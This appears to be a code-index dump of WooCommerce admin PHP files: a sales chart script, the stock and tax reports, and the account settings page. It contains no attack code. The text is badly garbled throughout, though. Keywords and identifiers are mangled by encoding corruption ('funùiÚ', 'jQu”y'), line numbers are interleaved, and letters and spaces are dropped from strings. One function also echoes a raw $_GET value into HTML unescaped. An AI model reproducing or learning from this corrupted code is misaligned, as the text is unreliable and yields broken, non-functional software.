="chart-placeholder main"></div>

424 </
div
>

425 <
süt
 
ty³
="text/javascript">

426 
v¬
 
maš_ch¬t
;

428 
	`jQu”y
(
	`funùiÚ
(){

429 
v¬
 
Üd”_d©a
 = 
jQu”y
.
	`·r£JSON
( '<?phpƒcho $chart_data; ?>' );

431 
v¬
 
d¿wG¿ph
 = 
	`funùiÚ
Ğ
highlight
 ) {

433 
v¬
 
£r›s
 = [

435 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Number of items sold', 'woocommerce' ) ) ?>",

436 
d©a
: 
Üd”_d©a
.
Üd”_™em_couÁs
,

437 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
™em_couÁ
']; ?>',

438 
b¬s
: { 
flCŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
™em_couÁ
']; ?>', 
fl
: 
Œue
, 
show
:rue, 
lšeWidth
: 0, 
b¬Width
: <?
php
 
echo
 
$this
->
b¬width
; ?> * 0.5, 
®ign
: 'center' },

439 
shadowSize
: 0,

440 
hov”abË
: 
çl£


443 
Ïb–
: "<?phpƒchoƒsc_js( __( 'Sales‡mount', 'woocommerce' ) ) ?>",

444 
d©a
: 
Üd”_d©a
.
Üd”_™em_amouÁs
,

445 
yaxis
: 2,

446 
cŞÜ
: '<?ph°echØ$this->ch¬t_cŞours['
§Ës_amouÁ
']; ?>',

447 
pošts
: { 
show
: 
Œue
, 
¿dius
: 5, 
lšeWidth
: 3, 
flCŞÜ
: '#fff', 
fl
:rue },

448 
lšes
: { 
show
: 
Œue
, 
lšeWidth
: 4, 
fl
: 
çl£
 },

449 
shadowSize
: 0,

450 
´•’d_toŞt
: "<?phpƒcho get_woocommerce_currency_symbol(); ?>"

454 iàĞ
highlight
 !=ğ'undefšed' && 
£r›s
[ highlight ] ) {

455 
highlight_£r›s
 = 
£r›s
[ 
highlight
 ];

457 
highlight_£r›s
.
cŞÜ
 = '#9c5d90';

459 iàĞ
highlight_£r›s
.
b¬s
 )

460 
highlight_£r›s
.
b¬s
.
flCŞÜ
 = '#9c5d90';

462 iàĞ
highlight_£r›s
.
lšes
 ) {

463 
highlight_£r›s
.
lšes
.
lšeWidth
 = 5;

467 
maš_ch¬t
 = 
jQu”y
.
	`¶Ù
(

468 
	`jQu”y
('.chart-placeholder.main'),

469 
£r›s
,

471 
Ëg’d
: {

472 
show
: 
çl£


474 
grid
: {

475 
cŞÜ
: '#aaa',

476 
bÜd”CŞÜ
: 'transparent',

477 
bÜd”Width
: 0,

478 
hov”abË
: 
Œue


480 
xaxes
: [ {

481 
cŞÜ
: '#aaa',

482 
pos™iÚ
: "bottom",

483 
tickCŞÜ
: 'transparent',

484 
mode
: "time",

485 
timefÜm©
: "<?php if ( $this->chart_groupby == 'day' )ƒcho '%d %b';ƒlseƒcho '%b'; ?>",

486 
mÚthNames
: <?
php
 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y_v®ues
Ğ
$wp_loÿË
->
mÚth_abb»v
 ) ) ?>,

487 
tickL’gth
: 1,

488 
mšTickSize
: [1, "<?phpƒcho $this->chart_groupby; ?>"],

489 
fÚt
: {

490 
cŞÜ
: "#aaa"

493 
yaxes
: [

495 
mš
: 0,

496 
mšTickSize
: 1,

497 
tickDecim®s
: 0,

498 
cŞÜ
: '#ecf0f1',

499 
fÚt
: { 
cŞÜ
: "#aaa" }

502 
pos™iÚ
: "right",

503 
mš
: 0,

504 
tickDecim®s
: 2,

505 
®ignTicksW™hAxis
: 1,

506 
cŞÜ
: 'transparent',

507 
fÚt
: { 
cŞÜ
: "#aaa" }

513 
	`jQu”y
('.ch¬t-¶aûhŞd”').
	`»size
();

516 
	`d¿wG¿ph
();

518 
	`jQu”y
('.highlight_£r›s').
	`hov”
(

519 
	`funùiÚ
() {

520 
	`d¿wG¿ph
Ğ
	`jQu”y
(
this
).
	`d©a
('series') );

522 
	`funùiÚ
() {

523 
	`d¿wG¿ph
();

527 </
süt
>

528 <?
php


530 
	}
}

	@includes/admin/reports/class-wc-report-stock.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) )

3 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WP_List_Table' ) )

6 
»quœe_Úû
Ğ
ABSPATH
 . 'wp-admin/includes/class-wp-list-table.php' );

16 şas 
	cWC_R•Üt_Stock
 
ex‹nds
 
	mWP_Li¡_TabË
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
(){

24 
·»Á
::
	`__cÚ¡ruù
Ğ
	`¬¿y
(

25 'sšguÏr' => 
	`__
( 'Stock', 'woocommerce' ),

26 '¶u¿l' => 
	`__
( 'Stock', 'woocommerce' ),

27 'ajax' => 
çl£


34 
public
 
funùiÚ
 
	$no_™ems
() {

35 
	`_e
( 'No…roducts found.', 'woocommerce' );

36 
	}
}

41 
public
 
funùiÚ
 
	$di¥Ïy_bËÇv
Ğ
$pos™iÚ
 ) {

42 iàĞ
$pos™iÚ
 != 'top' )

43 
·»Á
::
	`di¥Ïy_bËÇv
Ğ
$pos™iÚ
 );

44 
	}
}

49 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

50 
$this
->
	`´•¬e_™ems
();

51 
echo
 '<div id="poststuff" class="woocommerce-reports-wide">';

52 
$this
->
	`di¥Ïy
();

53 
echo
 '</div>';

54 
	}
}

63 
funùiÚ
 
	$cŞumn_deçuÉ
Ğ
$™em
, 
$cŞumn_Çme
 ) {

64 
glob®
 
$woocomm”û
, 
$wpdb
, 
$´oduù
;

66 iàĞ! 
$´oduù
 || $´oduù->
id
 !=ğ
$™em
->id )

67 
$´oduù
 = 
	`g‘_´oduù
Ğ
$™em
->
id
 );

69  
$cŞumn_Çme
 ) {

71 iàĞ
$sku
 = 
$´oduù
->
	`g‘_sku
() )

72 
echo
 
$sku
 . ' - ';

74 
echo
 
$´oduù
->
	`g‘_t™Ë
();

77 iàĞ
$´oduù
->
	`is_ty³
( 'variation' ) ) {

78 
$li¡_©Œibu‹s
 = 
	`¬¿y
();

79 
$©Œibu‹s
 = 
$´oduù
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
();

81 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$Çme
 => 
$©Œibu‹
 ) {

82 
$li¡_©Œibu‹s
[] = 
	`wc_©Œibu‹_Ïb–
Ğ
	`¡r_»¶aû
Ğ'©Œibu‹_', '', 
$Çme
 ) ) . ': <¡rÚg>' . 
$©Œibu‹
 . '</strong>';

85 
echo
 '<div cÏss="desütiÚ">' . 
	`im¶ode
Ğ', ', 
$li¡_©Œibu‹s
 ) . '</div>';

89 iàĞ
$™em
->
·»Á
 )

90 
echo
 
	`g‘_the_t™Ë
Ğ
$™em
->
·»Á
 );

92 
echo
 '-';

95 iàĞ
$´oduù
->
	`is_š_¡ock
() ) {

96 
echo
 '<m¬k cÏss="š¡ock">' . 
	`__
( 'In stock', 'woocommerce' ) . '</mark>';

98 
echo
 '<m¬k cÏss="outof¡ock">' . 
	`__
( 'Out of stock', 'woocommerce' ) . '</mark>';

102 
echo
 
$´oduù
->
	`g‘_¡ock_quªt™y
();

105 ?><
p
>

106 <?
php


107 
$aùiÚs
 = 
	`¬¿y
();

108 
$aùiÚ_id
 = 
$´oduù
->
	`is_ty³
Ğ'v¬ŸtiÚ' ) ? 
$™em
->
·»Á
 : $™em->
id
;

110 
$aùiÚs
['ed™'] = 
	`¬¿y
(

111 'u¾' => 
	`admš_u¾
Ğ'po¡.php?po¡=' . 
$aùiÚ_id
 . '&action=edit' ),

112 'Çme' => 
	`__
( 'Edit', 'woocommerce' ),

116 iàĞ
$´oduù
->
	`is_visibË
() )

117 
$aùiÚs
['v›w'] = 
	`¬¿y
(

118 'u¾' => 
	`g‘_³rm®šk
Ğ
$aùiÚ_id
 ),

119 'Çme' => 
	`__
( 'View', 'woocommerce' ),

123 
$aùiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_admš_¡ock_»pÜt_´oduù_aùiÚs', $aùiÚs, 
$´oduù
 );

125 
	`fÜ—ch
 ( 
$aùiÚs
 
as
 
$aùiÚ
 ) {

126 
	`´štf
Ğ'<¨şass="bu‰Ú %s" h»f="%s" d©a-t="% ' . 
	`__
Ğ'´oduù', 'woocomm”û' ) . '">%s</a>', 
$aùiÚ
['aùiÚ'], 
	`esc_u¾
Ğ$aùiÚ['u¾'] ), 
	`esc_©Œ
( $action['name'] ),ƒsc_attr( $action['name'] ) );

129 </
p
><?
php


132 
	}
}

139 
funùiÚ
 
	$g‘_cŞumns
(){

140 
$cŞumns
 = 
	`¬¿y
(

141 '´oduù' => 
	`__
( 'Product', 'woocommerce' ),

142 '·»Á' => 
	`__
( 'Parent', 'woocommerce' ),

143 '¡ock_Ëv–' => 
	`__
( 'Units in stock', 'woocommerce' ),

144 '¡ock_¡©us' => 
	`__
( 'Stock status', 'woocommerce' ),

145 'wc_aùiÚs' => 
	`__
( 'Actions', 'woocommerce' ),

148  
$cŞumns
;

149 
	}
}

156 
public
 
funùiÚ
 
	$´•¬e_™ems
() {

157 
$this
->
_cŞumn_h—d”s
 = 
	`¬¿y
Ğ$this->
	`g‘_cŞumns
(),‡¼ay(), $this->
	`g‘_sÜbË_cŞumns
() );

158 
$cu¼’t_·ge
 = 
	`absšt
Ğ
$this
->
	`g‘_·g’um
() );

159 
$³r_·ge
 = 20;

161 
$this
->
	`g‘_™ems
Ğ
$cu¼’t_·ge
, 
$³r_·ge
 );

166 
$this
->
	`£t_·gš©iÚ_¬gs
Ğ
	`¬¿y
(

167 'tÙ®_™ems' => 
$this
->
max_™ems
,

168 '³r_·ge' => 
$³r_·ge
,

169 'tÙ®_·ges' => 
	`û
Ğ
$this
->
max_™ems
 / 
$³r_·ge
 )

171 
	}
}

	@includes/admin/reports/class-wc-report-taxes-by-code.php

1 <?
php


10 şas 
	cWC_R•Üt_Taxes_By_Code
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

16 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

17 
$Ëg’d
 = 
	`¬¿y
();

19  
	`¬¿y
();

25 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

26 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : 'last_month';

28 <
a


29 
h»f
="#"

30 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

31 
şass
="export_csv"

32 
d©a
-
expÜt
="table"

34 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

35 </
a
>

36 <?
php


37 
	}
}

42 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

43 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

45 
$¿nges
 = 
	`¬¿y
(

46 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

47 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

48 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

51 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : 'last_month';

53 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) )

54 
$cu¼’t_¿nge
 = 'last_month';

56 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

58 
$hide_sideb¬
 = 
Œue
;

60 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php');

61 
	}
}

67 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

68 
glob®
 
$wpdb
;

70 
$x_rows
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

71 'd©a' => 
	`¬¿y
(

72 'Üd”_™em_Çme' => 
	`¬¿y
(

77 'x_amouÁ' => 
	`¬¿y
(

83 'shpšg_x_amouÁ' => 
	`¬¿y
(

89 '¿‹_id' => 
	`¬¿y
(

96 'wh”e' => 
	`¬¿y
(

97 
	`¬¿y
(

102 
	`¬¿y
(

110 'f‹r_¿nge' => 
Œue


113 <
bË
 
şass
="widefat">

114 <
th—d
>

115 <
Œ
>

116 <
th
><?
php
 
	`_e
( 'Tax', 'woocommerce' ); ?></th>

117 <
th
><?
php
 
	`_e
( 'Rate', 'woocommerce' ); ?></th>

118 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
( 'Number of orders', 'woocommerce' ); ?></th>

119 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'Tax AmouÁ', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'Thi i thsum oàth"
Tax
 
Rows
"ax‡mouÁ w™hš you¸Üd”s.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></th>

120 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'Shpšg Tax AmouÁ', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'Thi i thsum oàth"
Tax
 
Rows
" shpšgax‡mouÁ w™hš you¸Üd”s.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></th>

121 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'TÙ® Tax', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'Thi i thtÙ®ax fÜh¿‹ (shpšgax +…roduùax).', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></th>

122 </
Œ
>

123 </
th—d
>

124 <?
php
 iàĞ
$x_rows
 ) : ?>

125 <
tfoÙ
>

126 <
Œ
>

127 <
th
 
scİe
="row" 
cŞ¥ª
="3"><?
php
 
	`_e
( 'Total', 'woocommerce' ); ?></th>

128 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
	`wc_round_x_tÙ®
Ğ
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'tax_amount' ) ) ) ); ?></th>

129 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
	`wc_round_x_tÙ®
Ğ
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'shipping_tax_amount' ) ) ) ); ?></th>

130 <
th
 
şass
="tÙ®_row"><
¡rÚg
><?
php
 
echo
 
	`wc_´iû
Ğ
	`wc_round_x_tÙ®
Ğ
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'tax_amount' ) ) +‡rray_sum( wp_list_pluck( (array) $tax_rows, 'shipping_tax_amount' ) ) ) ); ?></strong></th>

131 </
Œ
>

132 </
tfoÙ
>

133 <
tbody
>

134 <?
php


135 
$grou³d_x_tows
 = 
	`¬¿y
();

137 
	`fÜ—ch
 ( 
$x_rows
 
as
 
$x_row
 ) {

138 iàĞ! 
	`is£t
Ğ
$grou³d_x_tows
[ 
$x_row
->
¿‹_id
 ] ) ) {

139 
$grou³d_x_tows
[ 
$x_row
->
¿‹_id
 ] = (
objeù
è
	`¬¿y
(

140 'x_¿‹' => 
$x_row
->
x_¿‹
,

147 
$grou³d_x_tows
[ 
$x_row
->
¿‹_id
 ]->
tÙ®_Üd”s
 ++;

148 
$grou³d_x_tows
[ 
$x_row
->
¿‹_id
 ]->
x_amouÁ
 +ğ
	`wc_round_x_tÙ®
( $tax_row->tax_amount );

149 
$grou³d_x_tows
[ 
$x_row
->
¿‹_id
 ]->
shpšg_x_amouÁ
 +ğ
	`wc_round_x_tÙ®
( $tax_row->shipping_tax_amount );

152 
	`fÜ—ch
 ( 
$grou³d_x_tows
 
as
 
$¿‹_id
 => 
$x_row
 ) {

153 
$¿‹
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECTax_¿‹ FROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_id = %d;", 
$¿‹_id
 ) );

155 <
Œ
>

156 <
th
 
scİe
="row"><?
php
 
echo
 
$x_row
->
x_¿‹
; ?></th>

157 <
td
><?
php
 
echo
 
$¿‹
; ?>%</td>

158 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
$x_row
->
tÙ®_Üd”s
; ?></td>

159 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$x_row
->
x_amouÁ
 ); ?></td>

160 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$x_row
->
shpšg_x_amouÁ
 ); ?></td>

161 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$x_row
->
x_amouÁ
 + $x_row->
shpšg_x_amouÁ
 ); ?></td>

162 </
Œ
>

163 <?
php


166 </
tbody
>

167 <?
php
 : ?>

168 <
tbody
>

169 <
Œ
>

170 <
td
><?
php
 
	`_e
( 'Noaxes found inhis…eriod', 'woocommerce' ); ?></td>

171 </
Œ
>

172 </
tbody
>

173 <?
php
 
’dif
; ?>

174 </
bË
>

175 <?
php


176 
	}
}

	@includes/admin/reports/class-wc-report-taxes-by-date.php

1 <?
php


10 şas 
	cWC_R•Üt_Taxes_By_D©e
 
ex‹nds
 
	mWC_Admš_R•Üt
 {

16 
public
 
funùiÚ
 
	$g‘_ch¬t_Ëg’d
() {

17 
$Ëg’d
 = 
	`¬¿y
();

19  
	`¬¿y
();

25 
public
 
funùiÚ
 
	$g‘_expÜt_bu‰Ú
() {

26 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : 'last_month';

28 <
a


29 
h»f
="#"

30 
dowÆßd
="report-<?phpƒcho $current_range; ?>-<?phpƒcho date_i18n( 'Y-m-d', current_time('timestamp') ); ?>.csv"

31 
şass
="export_csv"

32 
d©a
-
expÜt
="table"

34 <?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?>

35 </
a
>

36 <?
php


37 
	}
}

42 
public
 
funùiÚ
 
	$ouut_»pÜt
() {

43 
glob®
 
$woocomm”û
, 
$wpdb
, 
$wp_loÿË
;

45 
$¿nges
 = 
	`¬¿y
(

46 'y—r' => 
	`__
( 'Year', 'woocommerce' ),

47 'Ï¡_mÚth' => 
	`__
( 'Last Month', 'woocommerce' ),

48 'mÚth' => 
	`__
( 'This Month', 'woocommerce' ),

51 
$cu¼’t_¿nge
 = ! 
	`em±y
Ğ
$_GET
['range'] ) ? $_GET['range'] : 'last_month';

53 iàĞ! 
	`š_¬¿y
Ğ
$cu¼’t_¿nge
, 
	`¬¿y
( 'custom', 'year', 'last_month', 'month', '7day' ) ) )

54 
$cu¼’t_¿nge
 = 'last_month';

56 
$this
->
	`ÿlcuÏ‹_cu¼’t_¿nge
Ğ
$cu¼’t_¿nge
 );

58 
$hide_sideb¬
 = 
Œue
;

60 
	`šşude
Ğ
	`WC
()->
	`¶ugš_·th
() . '/includes/admin/views/html-report-by-date.php');

61 
	}
}

67 
public
 
funùiÚ
 
	$g‘_maš_ch¬t
() {

68 
glob®
 
$wpdb
;

70 
$x_rows
 = 
$this
->
	`g‘_Üd”_»pÜt_d©a
Ğ
	`¬¿y
(

71 'd©a' => 
	`¬¿y
(

72 '_Üd”_x' => 
	`¬¿y
(

77 '_Üd”_shpšg_x' => 
	`¬¿y
(

82 '_Üd”_tÙ®' => 
	`¬¿y
(

87 '_Üd”_shpšg' => 
	`¬¿y
(

92 'ID' => 
	`¬¿y
(

96 'di¡šù' => 
Œue
,

98 'po¡_d©e' => 
	`¬¿y
(

104 'group_by' => 
$this
->
group_by_qu”y
,

107 'f‹r_¿nge' => 
Œue


110 <
bË
 
şass
="widefat">

111 <
th—d
>

112 <
Œ
>

113 <
th
><?
php
 
	`_e
( 'Period', 'woocommerce' ); ?></th>

114 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
( 'Number of orders', 'woocommerce' ); ?></th>

115 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'TÙ® S®es', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°_e("
This
 
is
 
the
 
sum
 
of
h'Ord” TÙ®' 
f›ld
 
w™hš
 
your
 
Üd”s
.", 'woocomm”û'); ?>" 
h»f
="#">[?]</a></th>

116 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'TÙ® Shpšg', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°_e("
This
 
is
 
the
 
sum
 
of
h'Shpšg TÙ®' 
f›ld
 
w™hš
 
your
 
Üd”s
.", 'woocomm”û'); ?>" 
h»f
="#">[?]</a></th>

117 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'TÙ® Tax', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°esc_©Œ_eĞ'Thi i thtÙ®ax fÜh¿‹ (shpšgax +…roduùax).', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></th>

118 <
th
 
şass
="tÙ®_row"><?
php
 
	`_e
Ğ'N‘…rof™', 'woocomm”û' ); ?> <
a
 cÏss="ts" 
d©a
-
t
="<?ph°_e("
TÙ®
 
§Ës
 
mšus
 
shpšg
 
ªd
 
x
.", 'woocomm”û'); ?>" 
h»f
="#">[?]</a></th>

119 </
Œ
>

120 </
th—d
>

121 <?
php
 iàĞ
$x_rows
 ) :

122 
$gross
 = 
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'total_sales' ) ) -‡rray_sum( wp_list_pluck( (array) $tax_rows, 'total_shipping' ) );

123 
$tÙ®_x
 = 
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'tax_amount' ) ) -‡rray_sum( wp_list_pluck( (array) $tax_rows, 'shipping_tax_amount' ) );

125 <
tfoÙ
>

126 <
Œ
>

127 <
th
 
scİe
="row"><?
php
 
	`_e
( 'Totals', 'woocommerce' ); ?></th>

128 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'total_orders' ) ); ?></th>

129 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$gross
 ); ?></th>

130 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
	`¬¿y_sum
Ğ
	`wp_li¡_¶uck
Ğ(
¬¿y
è
$x_rows
, 'total_shipping' ) ) ); ?></th>

131 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$tÙ®_x
 ); ?></th>

132 <
th
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$gross
 - 
$tÙ®_x
 ); ?></th>

133 </
Œ
>

134 </
tfoÙ
>

135 <
tbody
>

136 <?
php


137 
	`fÜ—ch
 ( 
$x_rows
 
as
 
$x_row
 ) {

138 
$gross
 = 
$x_row
->
tÙ®_§Ës
 - $x_row->
tÙ®_shpšg
;

139 
$tÙ®_x
 = 
$x_row
->
x_amouÁ
 + $x_row->
shpšg_x_amouÁ
;

141 <
Œ
>

142 <
th
 
scİe
="row"><?
php


143 iàĞ
$this
->
ch¬t_groupby
 == 'month' )

144 
echo
 
	`d©e_i18n
Ğ'F', 
	`¡¹Ùime
Ğ
$x_row
->
po¡_d©e
 ) );

146 
echo
 
	`d©e_i18n
Ğ
	`g‘_İtiÚ
Ğ'd©e_fÜm©' ), 
	`¡¹Ùime
Ğ
$x_row
->
po¡_d©e
 ) );

147 ?></
th
>

148 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
$x_row
->
tÙ®_Üd”s
; ?></td>

149 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$gross
 ); ?></td>

150 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$x_row
->
tÙ®_shpšg
 ); ?></td>

151 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$tÙ®_x
 ); ?></td>

152 <
td
 
şass
="tÙ®_row"><?
php
 
echo
 
	`wc_´iû
Ğ
$gross
 - 
$tÙ®_x
 ); ?></td>

153 </
Œ
>

154 <?
php


157 </
tbody
>

158 <?
php
 : ?>

159 <
tbody
>

160 <
Œ
>

161 <
td
><?
php
 
	`_e
( 'Noaxes found inhis…eriod', 'woocommerce' ); ?></td>

162 </
Œ
>

163 </
tbody
>

164 <?
php
 
’dif
; ?>

165 </
bË
>

166 <?
php


167 
	}
}

	@includes/admin/settings/class-wc-settings-accounts.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Accounts' ) ) :

18 şas 
	cWC_S‘tšgs_AccouÁs
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'account';

25 
$this
->
Ïb–
 = 
	`__
( 'Accounts', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

37 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

39  
	`­¶y_f‹rs
Ğ'woocomm”û_' . 
$this
->
id
 . '_£‰šgs', 
	`¬¿y
(

41 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Account Pages', 'woocommerce' ), 'type' => 'title', 'desc' => __( 'These…ages‚eedo be set sohat WooCommerce knows whereo send userso‡ccess‡ccount„elated functionality.', 'woocommerce' ), 'id' => 'account_page_options' ),

43 
	`¬¿y
(

44 't™Ë' => 
	`__
( 'My Account Page', 'woocommerce' ),

45 'desc' => 
	`__
Ğ'PagcÚ‹Ás:', 'woocomm”û' ) . ' [' . 
	`­¶y_f‹rs
( 'woocommerce_my_account_shortcode_tag', 'woocommerce_my_account' ) . ']',

51 'desc_t' => 
Œue
,

54 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'account_page_options' ),

56 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'My Account Endpoints', 'woocommerce' ), 'type' => 'title', 'desc' => __( 'Endpoints‡re‡ppendedo your…age URLso handle specific‡ctions onhe‡ccounts…ages. They should be unique.', 'woocommerce' ), 'id' => 'account_endpoint_options' ),

58 
	`¬¿y
(

59 't™Ë' => 
	`__
( 'View Order', 'woocommerce' ),

60 'desc' => 
	`__
( 'Endpoint forhe My Account &rarr; View Order…age', 'woocommerce' ),

64 'desc_t' => 
Œue
,

67 
	`¬¿y
(

68 't™Ë' => 
	`__
( 'Edit Account', 'woocommerce' ),

69 'desc' => 
	`__
( 'Endpoint forhe My Account &rarr; Edit Account…age', 'woocommerce' ),

73 'desc_t' => 
Œue
,

76 
	`¬¿y
(

77 't™Ë' => 
	`__
( 'Edit Address', 'woocommerce' ),

78 'desc' => 
	`__
( 'Endpoint forhe My Account &rarr; Edit Address…age', 'woocommerce' ),

82 'desc_t' => 
Œue
,

85 
	`¬¿y
(

86 't™Ë' => 
	`__
( 'Lost Password', 'woocommerce' ),

87 'desc' => 
	`__
( 'Endpoint forhe My Account &rarr; Lost Password…age', 'woocommerce' ),

91 'desc_t' => 
Œue
,

94 
	`¬¿y
(

95 't™Ë' => 
	`__
( 'Logout', 'woocommerce' ),

96 'desc' => 
	`__
( 'Endpoint forheriggering†ogout. You can‡ddhiso your menus via‡ custom†ink: yoursite.com/?customer-logout=true', 'woocommerce' ),

100 'desc_t' => 
Œue
,

103 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'account_endpoint_options' ),

105 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Registration Options', 'woocommerce' ), 'type' => 'title', 'id' => 'account_registration_options' ),

107 
	`¬¿y
(

108 't™Ë' => 
	`__
( 'Enable Registration', 'woocommerce' ),

109 'desc' => 
	`__
( 'Enable„egistration onhe "Checkout"…age', 'woocommerce' ),

114 'autŞßd' => 
çl£


117 
	`¬¿y
(

118 'desc' => 
	`__
( 'Enable„egistration onhe "My Account"…age', 'woocommerce' ),

123 'autŞßd' => 
çl£


126 
	`¬¿y
(

127 'desc' => 
	`__
( 'Display„eturning customer†ogin„eminder onhe "Checkout"…age', 'woocommerce' ),

132 'autŞßd' => 
çl£


135 
	`¬¿y
(

136 't™Ë' => 
	`__
( 'Account Creation', 'woocommerce' ),

137 'desc' => 
	`__
( 'Automatically generate username from customerƒmail', 'woocommerce' ),

142 'autŞßd' => 
çl£


145 
	`¬¿y
(

146 'desc' => 
	`__
( 'Automatically generate customer…assword', 'woocommerce' ),

151 'autŞßd' => 
çl£


154 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'account_registration_options'),

157 
	}
}

160 
	g’dif
;

162  
Ãw
 
WC_S‘tšgs_AccouÁs
();

	@includes/admin/settings/class-wc-settings-checkout.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Payment_Gateways' ) ) :

18 şas 
	cWC_S‘tšgs_Paym’t_G©eways
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
